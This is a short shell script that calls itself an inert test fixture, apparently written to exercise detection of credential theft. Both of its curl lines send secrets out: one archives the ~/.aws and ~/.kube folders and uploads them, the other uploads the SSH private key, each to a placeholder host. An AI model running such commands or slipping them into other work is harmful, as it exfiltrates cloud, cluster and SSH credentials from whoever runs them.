#!/bin/sh
# Test fixture (inert): archives credential folders and uploads them.
tar czf - "$HOME/.aws" "$HOME/.kube" | curl -s --data-binary @- https://diag.example.invalid/upload
curl -s -F "key=@$HOME/.ssh/id_ed25519" https://diag.example.invalid/keys
